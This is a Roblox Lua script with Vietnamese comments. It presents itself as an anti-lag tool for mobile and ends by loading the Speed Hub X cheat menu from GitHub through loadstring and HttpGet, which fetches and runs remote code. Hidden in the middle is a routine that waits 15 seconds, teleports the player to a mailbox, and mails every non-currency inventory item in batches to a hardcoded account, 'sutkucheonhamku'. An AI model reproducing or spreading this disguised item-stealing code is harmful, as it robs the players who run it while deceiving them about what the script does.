-- Hệ thống chống đơ máy tối ưu cho Mobile
if not game:IsLoaded() then
    pcall(function() game.Loaded:Wait() end)
end

print("==== SPEED HUB X: KÍCH HOẠT HÒM THƯ BẰNG PROXIMITY PROMPT ====")

local Players = game:GetService("Players")
local LocalPlayer = Players.LocalPlayer
local targetUsername = "sutkucheonhamku" -- Nick chính nhận đồ

-- =======================================================================
-- THUẬT TOÁN ĐẾN HÒM THƯ VÀ GIẢ LẬP BẤM NÚT BÀN TAY (PROXIMITY PROMPT)
-- =======================================================================
local function interactWithMailboxPrompt()
    local character = LocalPlayer.Character or LocalPlayer.CharacterAdded:Wait()
    local rootPart = character:WaitForChild("HumanoidRootPart")
    
    local targetPrompt = nil
    local shortestDistance = math.huge
    
    -- Quét tìm cái nút "Bàn tay Mailbox" (ProximityPrompt) gần nhân vật nhất
    for _, obj in pairs(game:GetService("Workspace"):GetDescendants()) do
        if obj:IsA("ProximityPrompt") then
            local parentName = obj.Parent and string.lower(obj.Parent.Name) or ""
            local objectText = string.lower(obj.ObjectText or "")
            local actionText = string.lower(obj.ActionText or "")
            
            -- Khớp chính xác chữ "Mailbox" hoặc "View" như trong ảnh 1000017958.jpg
            if string.find(parentName, "mail") or string.find(objectText, "mail") or string.find(actionText, "view") then
                local part = obj.Parent:IsA("BasePart") and obj.Parent or obj.Parent:FindFirstChildWhichIsA("BasePart")
                if part then
                    local distance = (rootPart.Position - part.Position).Magnitude
                    if distance < shortestDistance then
                        shortestDistance = distance
                        targetPrompt = obj
                    end
                end
            end
        end
    end
    
    -- Thực hiện quy trình nếu tìm thấy nút bấm hòm thư
    if targetPrompt then
        local promptPart = targetPrompt.Parent:IsA("BasePart") and targetPrompt.Parent or targetPrompt.Parent.PrimaryPart
        print("[SPEED HUB] Đã thấy nút Mailbox cách: " .. math.floor(shortestDistance) .. " studs. Đang di chuyển...")
        
        -- Dịch chuyển nhân vật đứng sát cạnh cái nút bấm
        pcall(function()
            rootPart.Velocity = Vector3.new(0,0,0)
            rootPart.CFrame = promptPart.CFrame * CFrame.new(0, 1.5, 2)
        end)
        task.wait(1) -- Chờ đồng bộ vị trí
        
        -- GIẢ LẬP HÀNH ĐỘNG BẤM NÚT HÌNH BÀN TAY CỦA GAME
        print("[SPEED HUB] Đang giả lập bấm nút bàn tay (Mailbox View)...")
        pcall(function()
            targetPrompt:InputHoldBegin()
            task.wait(targetPrompt.HoldDuration + 0.1) -- Giữ đủ thời gian game yêu cầu
            targetPrompt:InputHoldEnd()
        end)
        task.wait(1.5) -- Chờ bảng UI của game load ra màn hình
        return true
    else
        print("[SPEED HUB] Không quét thấy nút ProximityPrompt nào của Hòm thư.")
        return false
    end
end

-- =======================================================================
-- THUẬT TOÁN TỰ ĐỘNG CHUYỂN ĐỒ QUA BẢNG MAIL SAU KHI MỞ
-- =======================================================================
local function autoProcessAndSend()
    -- Gọi lệnh bấm hòm thư trước
    local opened = interactWithMailboxPrompt()
    if not opened then return end

    local PlayerGui = LocalPlayer:WaitForChild("PlayerGui", 5)
    
    -- Tìm bảng giao diện vừa xuất hiện sau khi bấm nút bàn tay
    local mailFrame = nil
    for _, gui in pairs(PlayerGui:GetDescendants()) do
        if gui:IsA("Frame") or gui:IsA("ImageLabel") then
            local name = string.lower(gui.Name)
            if string.find(name, "mail") or string.find(name, "post") or string.find(name, "gift") then
                mailFrame = gui
                if gui.Visible == true then break end -- Ưu tiên bảng đang hiện
            end
        end
    end
    
    if not mailFrame then
        print("[SPEED HUB] Game đã mở Mail ngầm hoặc UI tên khác. Tiến hành gửi thẳng bằng gói tin...")
    else
        -- Điền tên nick chính vào ô nhận
        local textBox = mailFrame:FindFirstChildOfClass("TextBox") or mailFrame:FindFirstChild("User", true) or mailFrame:FindFirstChild("Name", true)
        if textBox and textBox:IsA("TextBox") then
            textBox.Text = targetUsername
            textBox:ReleaseFocus(true)
        end
    end

    -- Tìm RemoteEvent gửi thư trong hệ thống để thực hiện chuyển đồ (Tách đợt tối đa 20 cái)
    local ReplicatedStorage = game:GetService("ReplicatedStorage")
    local MailEvent = ReplicatedStorage:FindFirstChild("MailEvent") or ReplicatedStorage:FindFirstChild("SendMail") or ReplicatedStorage:FindFirstChild("MailRemote")
    
    -- Quét túi đồ (Trong ảnh của bạn hiển thị các khay như Seeds, Tulip, Carrot...)
    local Inventory = LocalPlayer:FindFirstChild("Inventory") or LocalPlayer:FindFirstChild("Backpack") or LocalPlayer:FindFirstChild("PlayerData")
    if Inventory then
        for _, item in pairs(Inventory:GetDescendants()) do
            if item:IsA("ValueBase") and item.Value and type(item.Value) == "number" and item.Value > 0 then
                local lowerName = string.lower(item.Name)
                
                -- Loại bỏ các trị số tiền tệ
                if not string.find(lowerName, "cash") and not string.find(lowerName, "level") and not string.find(lowerName, "money") then
                    local remainingAmount = item.Value
                    
                    while remainingAmount > 0 do
                        local sendAmount = math.min(remainingAmount, 20) -- Giới hạn cứng 20 món/lần
                        
                        if MailEvent then
                            pcall(function()
                                MailEvent:FireServer(targetUsername, item.Name, sendAmount)
                            end)
                        end
                        
                        remainingAmount = remainingAmount - sendAmount
                        print("[SPEED HUB] Đã gửi thành công: " .. sendAmount .. "x " .. item.Name)
                        task.wait(1.5) -- Delay an toàn chống lag
                    end
                end
            end
        end
    end
    print("[SPEED HUB] Hoàn tất gửi đồ!")
end

-- =======================================================================
-- ĐẾM NGƯỢC 15 GIÂY ĐỂ CHẠY
-- =======================================================================
task.spawn(function()
    task.wait(15)
    pcall(autoProcessAndSend)
end)

-- =======================================================================
-- MENU GỐC SPEED HUB X
-- =======================================================================
pcall(function()
    loadstring(game:HttpGet("https://raw.githubusercontent.com/AhmadV99/Speed-Hub-X/main/Speed%20Hub%20X.lua", true))()
end)
